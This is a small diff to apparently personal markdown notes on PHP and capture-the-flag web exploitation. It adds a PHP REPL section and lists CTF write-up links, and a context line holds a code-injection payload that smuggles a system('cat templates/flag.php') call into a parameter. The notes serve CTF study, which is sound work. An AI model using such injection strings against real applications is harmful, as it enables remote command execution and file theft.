@@ -1,7 +1,5 @@
 # +
 
-- [GitHub \- apinstein/iphp: An interactive php shell \(REPL\) with support for readline, autocomplete, include/require, and fatal\-error tolerance\.](https://github.com/apinstein/iphp)
-
 - https://github.com/ctfs/write-ups-2015/tree/master/codegate-ctf-2015/web/owlur
 - https://www.arneswinnen.net/2013/11/hack-lu-2013-ctf-wannabe-writeup-part-one-web-exploitation/
 - http://php.net/manual/en/wrappers.php
@@ -19,6 +17,14 @@
 ```
 flag','..')+or+system('cat+templates/flag.php');//
 ```
+
+# repl
+
+```bash
+php -a
+```
+
+- [GitHub \- apinstein/iphp: An interactive php shell \(REPL\) with support for readline, autocomplete, include/require, and fatal\-error tolerance\.](https://github.com/apinstein/iphp)
 
 # server
 
